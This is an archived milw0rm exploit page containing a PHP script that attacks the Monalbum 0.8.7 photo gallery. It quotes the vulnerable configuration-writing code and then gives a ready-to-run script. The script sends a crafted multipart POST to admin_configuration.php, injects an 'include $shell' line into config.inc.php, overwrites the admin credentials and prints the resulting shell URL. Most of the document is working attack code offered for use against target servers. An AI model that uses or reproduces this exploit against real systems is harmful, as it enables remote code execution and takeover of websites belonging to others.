<html><head><title>Monalbum 0.8.7 Remote Code Execution Exploit</title></head><pre>&lt;?php

/*
        \\\|///
      \\  - -  //
       (  @ @ )
----oOOo--(_)-oOOo---------------------------------------------------

[ Y! Underground Group ]
[   Dj7xpl@yahoo.com   ]
[    Dj7xpl.2600.ir    ]

----ooooO-----Ooooo--------------------------------------------------
    (   )     (   )
     \ (       ) /
      \_)     (_/

---------------------------------------------------------------------

[!] Portal   :   Monalbum 0.8.7
[!] Download :   http://www.3dsrc.com/monalbum/
[!] Type     :   Remote Code Execution Exploit

---------------------------------------------------------------------
*/

/*
Vuln Code :

[Code]

&lt;?
	include(&quot;./secure.php&quot;);

	$glangage = $_POST['glangage'];	
	if (!isset($glangage)) include(&quot;../conf/config.inc.php&quot;); // inclut pas qd sauvegarde
	
	include (&quot;../lib/album.inc&quot;);  
	include_once(&quot;../lang/$glangage&quot;);
	

	$mod = $_POST['mod'];

  echo &quot;&lt;html&gt;&lt;head&gt;&lt;link rel=stylesheet type='text/css' href='../css/album.css'&gt;&lt;/head&gt;&lt;body bgcolor='FFFFFF'&gt;&quot;;

 if (isset($mod)) { //submit
   $fichier = &quot;../conf/config.inc.php&quot;;
   $fd = fopen($fichier, &quot;w&quot;);

	$gcfgBase = $_POST['gcfgBase'];
	$gcfgUser = $_POST['gcfgUser'];
	$gcfgPass = $_POST['gcfgPass'];
	$gcfgHote = $_POST['gcfgHote'];
	
	$gpage       = $_POST['gpage'];
	$grepertoire = $_POST['grepertoire'];
	$gfond       = $_POST['gfond'];
	$gtitre      = $_POST['gtitre'];
	$gcontour    = $_POST['gcontour'];
	
	$gsite         = $_POST['gsite'];
	$gracine       = $_POST['gracine'];
	$ghome         = $_POST['ghome'];
	$ghor          = $_POST['ghor'];
	$gvert         = $_POST['gvert'];	
	$grep_mini     = $_POST['grep_mini'];
	$gmini_hasard  = $_POST['gmini_hasard'];
	$gmenu_visible = $_POST['gmenu_visible'];
	$gslide        = $_POST['gslide'];
	
	$gadm_user   = $_POST['gadm_user'];
	$gadm_pass   = $_POST['gadm_pass'];

	$ggd_version  = $_POST['ggd_version'];
	$glangage     = $_POST['glangage'];
	$gversion     = $_POST['gversion'];

	$guse_copyright = $_POST['guse_copyright'];
	$gimg_copyright = $_POST['gimg_copyright'];

	$gordre_rep      = $_POST['gordre_rep'];
	$gclassement_rep = $_POST['gclassement_rep'];
	
	$grech_inactive   = $_POST['grech_inactive'];
	
   $chaine = &quot;&lt;?
	//  ---------- BASE DE DONNEES MYSQL Mysql database----------
	\$gcfgBase = \&quot;$gcfgBase\&quot;;  // nom de la base de données - database name
	\$gcfgUser = \&quot;$gcfgUser\&quot;;  // utilisateur - user
	\$gcfgPass = \&quot;$gcfgPass\&quot;;  // mot de passe  - password
	\$gcfgHote = \&quot;$gcfgHote\&quot;; // serveur mysql - mysql host

	// ---------- CONFIGURATION -------------------
	\$gpage       = \&quot;$gpage\&quot;; // couleur du fond de la page - backgroundcolor
	\$grepertoire = \&quot;$grepertoire\&quot;; // couleur des répertoires - color of the folders
	\$gfond       = \&quot;$gfond\&quot;;
	\$gtitre      = \&quot;$gtitre\&quot;;
	\$gcontour    = \&quot;$gcontour\&quot;; // couleur du contour - name of the contour

	\$gsite         = \&quot;$gsite\&quot;; // nom du site - name of website
	\$gracine       = \&quot;$gracine\&quot;; // nom de la racine - name of the root
	\$ghome         = \&quot;$ghome\&quot;; // adresse de la page d'accueil - adress of the homepage
	\$ghor          = \&quot;$ghor\&quot;; // nombre d'images horizontal - number of horizontal pictures
	\$gvert         = \&quot;$gvert\&quot;; // nombre d'images vertical - number of vertical pictures
	\$grep_mini     = \&quot;$grep_mini\&quot;;  // les répertoires doivent-ils apparaître en miniatures ? - Does the folders appear like thumbnails
	\$gmini_hasard  = \&quot;$gmini_hasard\&quot;; // les miniatures des répertoires sont-elles prises au hasard ? - The thumbnails of the folders are random displayed ?
	\$gmenu_visible = \&quot;$gmenu_visible\&quot;; // le menu doit-il être visible ? - Does the menu be visible ?
	\$gslide        = \&quot;$gslide\&quot;; // Voulez vous l'option de diaporama ? - Does the slide option be visible ?
	\$gordre_rep    = \&quot;$gordre_rep\&quot;; // ordre d'affichage des rubriques par nom ou index (locus) - Displaying order of the folder by name or index (locus)
	\$gclassement_rep = \&quot;$gclassement_rep\&quot;; // classement des rubriques ASC ou DESC - classification of the folder ASC or DESC
	\$grech_inactive = \&quot;$grech_inactive\&quot;; // Déactiver la recherche - disabled the research capabilities
	
	\$gadm_user  = \&quot;$gadm_user\&quot;;
	\$gadm_pass  = \&quot;$gadm_pass\&quot;;

	\$ggd_version = \&quot;$ggd_version\&quot;; // GD = bibliothèque graphique - GD = graphical library
	\$glangage    = \&quot;$glangage\&quot;;
	\$gversion    = \&quot;$gversion\&quot;; // version du programme - program version

	\$guse_copyright = \&quot;$guse_copyright\&quot; ; // Indique si doit rajouter une image de droits d'auteur (copyright) sur chaque image de l'album -  Tells if must add a copyright picture on each picture of the album.
	\$gimg_copyright = \&quot;$gimg_copyright\&quot;;  // Image à utiliser pour les droits d'auteur (copyright) -	Picture to use for the copyright.												
	
	
	?&gt;&quot;;
   
   fwrite ( $fd, $chaine);
   fclose($fd);   
[/Code]
*/

if ($argc&lt;2) {
print_r('
-----------------------------------------------------------------------------

Usage: php '.$argv[0].' Host Path Options
host:       Target server (ip/hostname)
path:       Path To Folder

Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy

Example:
php '.$argv[0].' 127.0.0.1 /Gallery/ -P1.1.1.1:80

-----------------------------------------------------------------------------
');

die;
}

error_reporting(0);
ini_set(&quot;max_execution_time&quot;,0);
ini_set(&quot;default_socket_timeout&quot;,5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.=&quot;  .&quot;;}
   else
   {$result.=&quot;  &quot;.$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=&quot; &quot;.dechex(ord($string[$i]));}
   else
   {$exa.=&quot; 0&quot;.dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.=&quot;\r\n&quot;; $exa.=&quot;\r\n&quot;;}
  }
 return $exa.&quot;\r\n&quot;.$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacket($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo &quot;Connecting to &quot;.$parts[0].&quot;:&quot;.$parts[1].&quot; proxy...\r\n&quot;;
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}
function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy=&quot;&quot;;
for ($i=7; $i&lt;$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp&lt;&gt;&quot;-p&quot;) and ($temp&lt;&gt;&quot;-P&quot;)) {$cmd.=&quot; &quot;.$argv[$i];}
if ($temp==&quot;-p&quot;)
{
  $port=str_replace(&quot;-p&quot;,&quot;&quot;,$argv[$i]);
}
if ($temp==&quot;-P&quot;)
{
  $proxy=str_replace(&quot;-P&quot;,&quot;&quot;,$argv[$i]);
}
}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

/*Data*/

$data.='-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;smod&quot;


-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gcfgBase&quot;

www&quot;;include &quot;$shell&quot;;//
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gcfgUser&quot;

root
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gcfgPass&quot;

pass
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gcfgHote&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gpage&quot;

123
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;grepertoire&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gfond&quot;

#CCFF00
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gtitre&quot;

Y! Underground Group
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gcontour&quot;

111
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gsite&quot;

11122
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;ghome&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;ghor&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gvert&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;grep_mini&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gmini_hasard&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gmenu_visible&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gslide&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gadm_user&quot;

Dj7xpl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gadm_pass&quot;

Dj7xpl
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;ggd_version&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;glangage&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gversion&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;guse_copyright&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gimg_copyright&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gordre_rep&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;gclassement_rep&quot;

red
-----------------------------7d6224c08dc
Content-Disposition: form-data; name=&quot;grech_inactive&quot;

red
-----------------------------7d6224c08dc
';


/*Echo Header*/
echo &quot;[!] Monalbum 0.8.7 Remote Code Execution Exploit\r\n&quot;;
echo &quot;[!] Powered By Y! Underground Group\r\n&quot;;
echo &quot;[!] Vuln And Coded By Dj7xpl\r\n&quot;;

/*Sending Data*/
$packet =&quot;POST &quot;.$p.&quot;admin/admin_configuration.php HTTP/1.0\r\n&quot;;
$packet.=&quot;Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n&quot;;
$packet.=&quot;Content-Length: &quot;.strlen($data).&quot;\r\n&quot;;
$packet.=&quot;Host: &quot;.$host.&quot;\r\n&quot;;
$packet.=&quot;Cookie: PHPSESSID=95d2528efe9bc32210dbdd815ddb466b;\r\n&quot;;
$packet.=&quot;Accept-Language: fa\r\n&quot;;
$packet.=&quot;Referer: http://&quot;.$host.$path.&quot;admin.php\r\n&quot;;
$packet.=&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n&quot;;
$packet.=&quot;Connection: Close\r\n\r\n&quot;;
$packet.=$data;
sendpacket($packet);
sleep(2);
Echo &quot;[!] Shell : http://&quot;.$host.$path.&quot;conf/config.inc.php?shell=Evil Text\r\n&quot;;

?&gt;

# milw0rm.com [2007-05-11]</pre></html>